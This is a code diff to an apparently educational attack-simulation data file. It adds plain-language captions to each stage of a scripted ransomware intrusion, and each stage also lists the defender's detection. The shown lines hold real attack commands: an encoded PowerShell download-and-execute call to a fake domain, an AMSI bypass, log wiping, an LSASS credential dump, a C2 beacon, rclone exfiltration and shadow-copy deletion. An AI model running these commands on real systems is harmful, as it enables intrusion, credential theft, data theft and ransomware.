@@ -35,6 +35,7 @@ export const CAMPAIGN_STORY = {
       attackerPerspective: "We discovered an unpatched VPN portal at 198.51.100.24 and compiled a target list of 40 HR and Finance employee emails.",
       defenderPerspective: "Perimeter firewall logs periodic SYN scans from overseas bulletproof subnets. Low-severity alert logged, but no active intrusion detected.",
       commandExecuted: "nmap -sS -sV -T4 -p 80,443,8443,10443 vpn.apex-global.com\ntheHarvester -d apex-global.com -b linkedin,google",
+      commandCaption: "Scanning the company's public internet address for open doors (ports), and harvesting employee emails from LinkedIn — all without touching the internal network.",
       activeNodes: ["attacker", "firewall"],
       packetFlow: { from: "attacker", to: "firewall", type: "scan", label: "SYN Probe (Port 443)", speed: 1.2 },
       nodeStatusUpdates: {
@@ -60,6 +61,7 @@ export const CAMPAIGN_STORY = {
       attackerPerspective: "Infrastructure is live. Domain apex-secure-portal.com has 100% reputation score and valid SSL. Payload is compiled and bypasses static AV.",
       defenderPerspective: "Threat Intelligence feed flags registration of newly registered domain matching corporate brand name. Added to monitoring watchlist.",
       commandExecuted: "curl -X POST https://api.registrar.com/register -d domain=apex-secure-portal.com\nbuild_beacon.sh --profile apex_telemetry --format iso",
+      commandCaption: "Registering a fake domain that looks like the real company, and packaging the malware into an ISO disk image to evade email security filters.",
       activeNodes: ["attacker", "darkweb"],
       packetFlow: { from: "attacker", to: "darkweb", type: "deploy", label: "Staging Payload & VPS", speed: 1.0 },
       nodeStatusUpdates: {
@@ -85,6 +87,7 @@ export const CAMPAIGN_STORY = {
       attackerPerspective: "Target opened the email and mounted the ISO container. Waiting for user interaction with the disguised shortcut.",
       defenderPerspective: "Email gateway scanned the message; bypassed basic heuristics because the ISO contained no plain EXE file, only a nested shortcut.",
       commandExecuted: "sendmail -t s.jenkins@apex-global.com -f exec-office@apex-secure-portal.com \\\n  -s 'Confidential Executive Compensation 2026' -a 'Comp_2026.iso'",
+      commandCaption: "Sending a fake email disguised as coming from company leadership, with a malicious ISO file attached — designed to trick the recipient into opening it.",
       activeNodes: ["attacker", "firewall", "workstation"],
       packetFlow: { from: "darkweb", to: "workstation", type: "phish", label: "Spearphish ISO Delivery", speed: 1.4 },
       nodeStatusUpdates: {
@@ -110,6 +113,7 @@ export const CAMPAIGN_STORY = {
       attackerPerspective: "Stage-1 beacon executed successfully in memory! We have an interactive beacon session on PC-04 under user APEX\\sjenkins.",
       defenderPerspective: "Sysmon Event ID 1: powershell.exe spawned by explorer.exe with `-W Hidden -Enc` arguments. EDR agent raises alert.",
       commandExecuted: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBhAHAAZQB4AC0AcwBlAGMAdQByAGUALQBwAG8AcgB0AGEAbAAuAGMAbwBtAC8AYgAnACkA",
+      commandCaption: "Running a hidden PowerShell script (the long gibberish string is Base64-encoded to hide its contents) that downloads and executes malware entirely in RAM — no file is written to disk.",
       activeNodes: ["workstation"],
       packetFlow: { from: "darkweb", to: "workstation", type: "shellcode", label: "Reflective Shellcode in RAM", speed: 1.5 },
       nodeStatusUpdates: {
@@ -135,6 +139,7 @@ export const CAMPAIGN_STORY = {
       attackerPerspective: "Persistence established. Even if the system reboots or the user logs off, our beacon will re-spawn every 45 minutes.",
       defenderPerspective: "Security Event Log Event ID 4698: A scheduled task was created by a non-admin account pointing to user ProgramData directory.",
       commandExecuted: 'schtasks /create /tn "MicrosoftEdgeUpdateTaskUA" \\\n  /tr "C:\\ProgramData\\edge_updater.exe" /sc HOURLY /mo 1 /f',
+      commandCaption: "Creating a disguised Windows scheduled task that automatically restarts the malware every hour — even after a reboot — so the attacker can't be locked out.",
       activeNodes: ["workstation"],
       // Fix: was a self-loop (workstation→workstation) which rendered as a
       // stationary particle. Rerouted to firewall to show the beacon "calling home"
@@ -163,6 +168,7 @@ export const CAMPAIGN_STORY = {
       attackerPerspective: "Elevated successfully to NT AUTHORITY\\SYSTEM. We now have full kernel-level permissions on the local machine.",
       defenderPerspective: "EDR detects Sysmon Event ID 8: CreateRemoteThread called into spoolsv.exe with unbacked memory allocation.",
       commandExecuted: "Invoke-ReflectivePEInjection -ProcessId (Get-Process spoolsv).Id \\\n  -PEPath C:\\ProgramData\\elevate.dll",
+      commandCaption: "Injecting malicious code into the Windows Print Spooler process, which already runs with SYSTEM (highest) privileges — so the attacker inherits those admin rights.",
       activeNodes: ["workstation"],
       packetFlow: { from: "workstation", to: "workstation", type: "inject", label: "Injection into spoolsv.exe (SYSTEM)", speed: 1.6 },
       nodeStatusUpdates: {
@@ -188,6 +194,7 @@ export const CAMPAIGN_STORY = {
       attackerPerspective: "AMSI neutralized in memory. Local security event log cleared. Defenses blinded on this endpoint.",
       defenderPerspective: "SIEM triggers CRITICAL alert: Windows Event ID 1102 (The audit log was cleared). SIEM received the event before the local log was wiped!",
       commandExecuted: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\nwevtutil cl Security",
+      commandCaption: "First disabling Windows' malware-detection interface (AMSI) so antivirus goes blind, then wiping the Security event log to destroy all evidence of what they've done.",
       activeNodes: ["workstation"],
       packetFlow: { from: "workstation", to: "workstation", type: "evade", label: "Wiping Security Event Logs", speed: 1.0 },
       nodeStatusUpdates: {
@@ -213,6 +220,7 @@ export const CAMPAIGN_STORY = {
       attackerPerspective: "Jackpot! Extracted NTLM hash for 'APEX\\svc-domain-admin': e59c7... and plaintext Kerberos tickets.",
       defenderPerspective: "EDR LSASS memory protection rule trips: Process Access Mask 0x1010 (PROCESS_VM_READ) requested for lsass.exe.",
       commandExecuted: "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\\n  C:\\Temp\\lsass.dmp full",
+      commandCaption: "Dumping the memory of the LSASS process — Windows' password vault — to a file so it can be analysed offline to extract administrator passwords and authentication tokens.",
       activeNodes: ["workstation"],
       packetFlow: { from: "workstation", to: "workstation", type: "creds", label: "LSASS Memory Dump -> Hashes", speed: 1.4 },
       nodeStatusUpdates: {
@@ -238,6 +246,7 @@ export const CAMPAIGN_STORY = {
       attackerPerspective: "Identified Domain Controller at 10.0.1.10 (DC-01) and Financial Oracle DB at 10.0.2.50 (DB-01). Path to crown jewels is clear.",
       defenderPerspective: "Active Directory Honey-Account receives an unauthorized LDAP query from PC-04. Suspicious reconnaissance flagged.",
       commandExecuted: "nltest /dclist:apex.local\nnet group \"Domain Admins\" /domain\nnet view /all",
+      commandCaption: "Using built-in Windows commands (no malware needed) to list every Domain Controller and Domain Admin account — the equivalent of finding the building's master key locations.",
       activeNodes: ["workstation", "domainController", "database"],
       packetFlow: { from: "workstation", to: "domainController", type: "recon", label: "Active Directory LDAP Enumeration", speed: 1.3 },
       nodeStatusUpdates: {
@@ -264,6 +273,7 @@ export const CAMPAIGN_STORY = {
       attackerPerspective: "Pivoted successfully! We now possess active SYSTEM shells on both Domain Controller (DC-01) and DB-01.",
       defenderPerspective: "Windows Security Event ID 4624 (Logon Type 3) using NTLM authentication to DC-01 originating from an unprivileged workstation IP.",
       commandExecuted: "Invoke-WmiMethod -Class Win32_Process -Name Create \\\n  -ArgumentList 'cmd.exe /c C:\\Temp\\agent.exe' -ComputerName '10.0.1.10'",
+      commandCaption: "Using the stolen password hash (no need to crack it) to log into the Domain Controller and run a command remotely — like using a copied keycard on a door.",
       activeNodes: ["workstation", "domainController", "database"],
       packetFlow: { from: "workstation", to: "database", type: "lateral", label: "Pass-The-Hash SMB Pivot (Port 445)", speed: 1.5 },
       nodeStatusUpdates: {
@@ -290,6 +300,7 @@ export const CAMPAIGN_STORY = {
       attackerPerspective: "45 GB of customer financial records staged and encrypted with AES-256 in C:\\Temp\\apex_vault.7z. Ready for extraction.",
       defenderPerspective: "File Integrity Monitoring (FIM) detects rapid bulk read operations across the Financial Records volume outside business hours.",
       commandExecuted: "7z.exe a -tzip -pApexExtortionKey2026 -mhe=on -r \\\n  C:\\Temp\\apex_vault.7z D:\\Apex_Customer_Records\\*",
+      commandCaption: "Compressing and password-encrypting 45 GB of customer records into a zip archive — ready to be smuggled out. The encryption means defenders can't read it if they intercept the transfer.",
       activeNodes: ["database"],
       packetFlow: { from: "database", to: "database", type: "archive", label: "AES-256 Staging Archive (45 GB)", speed: 1.1 },
       nodeStatusUpdates: {
@@ -315,6 +326,7 @@ export const CAMPAIGN_STORY = {
       attackerPerspective: "C2 channel stable. Beacons routing commands across DC-01 and DB-01 with 30-second randomized jitter.",
       defenderPerspective: "Proxy logs show regular HTTPS POST beacons to newly created CDN endpoint with consistent JA4 TLS fingerprint.",
       commandExecuted: "beacon.exe --c2 https://cdn-azure-sync.net:443 --jitter 30 --sleep 45 --profile malleable_office",
+      commandCaption: "Starting an encrypted communication channel to the attacker's server disguised as normal Microsoft Azure traffic — so network monitoring tools can't tell it apart from legitimate business traffic.",
       activeNodes: ["database", "attacker"],
       packetFlow: { from: "database", to: "attacker", type: "c2", label: "Covert HTTPS C2 Beacon (Port 443)", speed: 1.3 },
       nodeStatusUpdates: {
@@ -340,6 +352,7 @@ export const CAMPAIGN_STORY = {
       attackerPerspective: "Exfiltration complete. 45 GB of customer data safely stored in our private cloud vault. Double extortion leverage secured.",
       defenderPerspective: "Cloud Access Security Broker (CASB) trips on anomalous outbound data volume: 45 GB egressed to unsanctioned cloud storage endpoint.",
       commandExecuted: "rclone.exe copy C:\\Temp\\apex_vault.7z remote:stealth-cloud-bucket \\\n  --bwlimit 15M --transfers 4",
+      commandCaption: "Uploading the stolen 45 GB archive to the attacker's anonymous cloud storage, throttled to 15 MB/s to avoid triggering bandwidth anomaly alarms.",
       activeNodes: ["database", "exfilCloud"],
       packetFlow: { from: "database", to: "exfilCloud", type: "exfil", label: "Exfiltrating 45 GB Encrypted Archive", speed: 1.8 },
       nodeStatusUpdates: {
@@ -366,6 +379,7 @@ export const CAMPAIGN_STORY = {
       attackerPerspective: "Network successfully locked. All database tables and shadow copies obliterated. Ransom note 'APEX_RECOVERY_README.txt' dropped.",
       defenderPerspective: "SOAR triggers enterprise lockdown: Host isolation active. Incident response war room declared. Crisis management team mobilized.",
       commandExecuted: "vssadmin.exe delete shadows /all /quiet\nnet stop MSSQLSERVER && net stop VeeamBackupSvc\nransomware.exe --encrypt-network --extension .locked --drop-note",
+      commandCaption: "First deleting all Windows backup snapshots (so recovery is impossible), then shutting down the database and backup services, then encrypting every file across the entire network with ransomware.",
       activeNodes: ["domainController", "database", "workstation"],
       packetFlow: { from: "domainController", to: "workstation", type: "impact", label: "GPO Ransomware Detonation (.locked)", speed: 2.0 },
       nodeStatusUpdates: {
